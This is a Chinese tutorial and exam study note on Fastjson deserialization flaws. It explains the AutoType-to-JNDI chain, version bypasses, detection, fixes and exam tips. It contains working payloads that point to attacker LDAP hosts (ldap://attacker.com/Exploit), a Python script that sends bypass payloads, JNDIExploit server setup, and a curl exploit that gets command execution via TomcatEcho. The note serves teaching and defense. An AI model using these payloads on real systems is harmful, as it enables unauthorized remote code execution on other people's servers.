# Fastjson 反序列化漏洞完整分析

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP

## 📋 提纲

1. Fastjson 概述
2. 反序列化漏洞原理
3. 各版本影响矩阵
4. 漏洞检测方法
5. 漏洞利用复现
6. 修复与版本升级

---

## 1. Fastjson 概述

Fastjson是阿里巴巴开源的Java JSON库，国内使用极其广泛。

```
影响面：几乎所有国内Java项目（Spring Boot/微服务/大数据）
漏洞历史：
  1.2.24  → AutoType默认开启（第一个RCE）
  1.2.25  → 加入AutoType黑名单（被绕过）
  1.2.47  → 缓存机制绕过黑名单（经典）
  1.2.68  → 期望类绕过黑名单
  1.2.80  → 最新已知绕过

核心问题：Fastjson的AutoType功能允许反序列化任意类→JNDI注入→RCE
```

---

## 2. 漏洞原理

### 2.1 AutoType 机制

```java
// Fastjson 通过 @type 字段指定反序列化的类
JSON.parseObject('{"@type":"com.example.User","name":"test"}')

// AutoType 默认开启 → 可以反序列化任意有构造函数/setter的类
// 攻击者可以指定恶意类：
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://attacker.com/Exploit",
  "autoCommit":true
}
// JdbcRowSetImpl 的 setAutoCommit() → connect() → JNDI lookup → RCE
```

### 2.2 攻击链

```
JSON请求 → @type指定恶意类 → Fastjson反序列化 → 
调用setter/构造方法 → JNDI lookup → LDAP加载远程类 → RCE
```

---

## 3. 各版本影响与绕过

| 版本 | 状态 | 利用链 |
|------|------|--------|
| ≤1.2.24 | 直接利用 | JdbcRowSetImpl/TemplatesImpl |
| 1.2.25-1.2.41 | 黑名单被绕过 | 用`L`前缀+`;`后缀绕过类名校验 |
| 1.2.42 | 修了L+; | 双写`LL`绕过 |
| 1.2.43 | 修了LL | `[{`绕过 |
| **1.2.47** | **经典绕过** | 利用缓存机制（MiscCodec）绕过黑名单 |
| 1.2.48-1.2.67 | — | 各种期望类绕过 |
| 1.2.68 | **期望类绕过** | 利用AutoCloseable接口 |
| ≥1.2.80 | 最新修复 | 暂无公开绕过 |

---

## 4. 漏洞检测

```python
#!/usr/bin/env python3
"""Fastjson 漏洞检测"""

import requests
import json
import urllib3
urllib3.disable_warnings()

class FastjsonDetector:
    def __init__(self, target):
        self.target = target

    def detect_fastjson(self):
        """检测是否使用Fastjson"""
        # 发送畸形JSON，看报错中是否有fastjson字样
        try:
            resp = requests.post(
                self.target,
                data='{"test":',
                headers={"Content-Type": "application/json"},
                verify=False, timeout=10
            )
            if 'fastjson' in resp.text.lower() or 'com.alibaba.fastjson' in resp.text:
                return {"detected": True, "evidence": "fastjson出现于错误信息"}
        except:
            pass
        return {"detected": False}

    def test_dnslog(self, dns_domain):
        """DNS外带检测（最安全的检测方式）"""
        payloads = [
            # 1.2.24  payload
            {"@type": "com.sun.rowset.JdbcRowSetImpl",
             "dataSourceName": f"ldap://fastjson-1-2-24.{dns_domain}/test",
             "autoCommit": True},
            # 1.2.47 payload
            {"a": {"@type": "java.lang.Class",
             "val": "com.sun.rowset.JdbcRowSetImpl"},
             "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
             "dataSourceName": f"ldap://fastjson-1-2-47.{dns_domain}/test",
             "autoCommit": True}},
        ]

        for i, payload in enumerate(payloads):
            try:
                resp = requests.post(
                    self.target,
                    json=payload,
                    verify=False, timeout=10
                )
                print(f"[Payload {i+1}] Status: {resp.status_code}")
            except:
                pass

        print(f"检查 {dns_domain} 的DNS查询记录")

    def test_version_bypass(self, dns_domain):
        """测试各类版本绕过payload"""
        payloads = {
            # 1.2.24 基础payload
            "v1.2.24": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":f"ldap://24.{dns_domain}/","autoCommit":True},
            # 1.2.47 缓存绕过
            "v1.2.47": {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":f"ldap://47.{dns_domain}/","autoCommit":True}},
            # 1.2.68 期望类绕过
            "v1.2.68": {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":f"ldap://68.{dns_domain}/"},
        }

        for version, payload in payloads.items():
            try:
                resp = requests.post(self.target, json=payload, verify=False, timeout=5)
                print(f"[{version}] Status: {resp.status_code}")
            except:
                pass
```


## 5. 漏洞利用

### 5.1 搭建JNDI服务

```bash
# 使用 JNDIExploit 或 marshalsec
git clone https://github.com/feihong-cs/JNDIExploit.git
cd JNDIExploit
mvn clean package -DskipTests

# 启动JNDI服务
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 10.0.0.1 -l 1389 -p 8080

# 选项中：
# -i: 攻击者IP
# -l: LDAP监听端口
# -p: HTTP端口（托管恶意class）
```

### 5.2 发送利用Payload

```bash
# Fastjson 1.2.47 经典利用
curl -X POST https://target.com/api/json \
  -H "Content-Type: application/json" \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://10.0.0.1:1389/TomcatEcho",
      "autoCommit": true
    }
  }'

# TomcatEcho 是一个无回弹的回显Payload
# 执行命令：在Header中加 cmd: whoami → 响应头中返回结果
```

---

## 6. 修复方案

```xml
<!-- pom.xml -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>  <!-- 或 2.0.25+ -->
</dependency>
```

```java
// 代码层面关闭AutoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);

// 或升级到 Fastjson 2.x（默认关闭AutoType）
import com.alibaba.fastjson2.JSON;
```

---

## ✅ Fastjson Checklist

- [ ] 全网Fastjson版本扫描
- [ ] DNS外带检测
- [ ] 各版本绕过payload测试
- [ ] 升级到最新安全版本
- [ ] 关闭AutoType或升级Fastjson2

> 📚 延伸阅读：Vuln/002-Log4Shell | Vuln/008-Shiro | CTF/009-JNDI

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| 反序列化漏洞原理 | 核心机制 | 不可信数据反序列化→魔术方法触发→代码执行；readObject()/unserialize()是入口 |
| Java反序列化 | 重点方向 | ObjectInputStream.readObject()、ysoserial利用链(CommonsCollections/CommonsBeanutils等) |
| PHP反序列化 | 重点方向 | unserialize()→__wakeup()/__destruct()/__toString()魔术方法→POP链构造 |
| Fastjson反序列化 | 国内重点 | AutoType开启→@type指定类→JNDI/LDAP远程加载→RCE |
| 检测方法 | 实战技巧 | 黑盒(特征字符/Base64编码)、白盒(搜索readObject/unserialize)、流量分析 |
| 修复方案 | 防护策略 | 类型白名单、禁用AutoType(升级Fastjson2)、使用安全的序列化方案(JSON/Protobuf) |

### 知识巧记口诀

> **反序列化口诀**：
> 不可信数据不反序列化，readObject是入口；
> Java看ysoserial链，CC链最经典；
> PHP看魔术方法，__wakeup和__destruct；
> Fastjson关AutoType，升级Fastjson2最安全。

> **检测三件套**：黑盒看Base64特征、白盒搜反序列化函数、流量分析找可疑类名。

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ 反序列化只影响Java | ✅ PHP、Python(pickle)、.NET、Ruby等多种语言都存在反序列化风险 |
| ❌ Fastjson升级到最新版就安全 | ✅ 需要关闭AutoType或升级到Fastjson2；历史上多次出现绕过，需持续关注 |
| ❌ 序列化用JSON就没风险 | ✅ JSON本身不触发反序列化漏洞，但如果JSON中包含类名解析(Fastjson)则仍有风险 |

> 💡 **一句话总结**：反序列化是跨语言的严重漏洞类型——Java的ysoserial、PHP的POP链、Fastjson的AutoType是三大考试重点，CISP考试考查原理理解和修复方案选择。
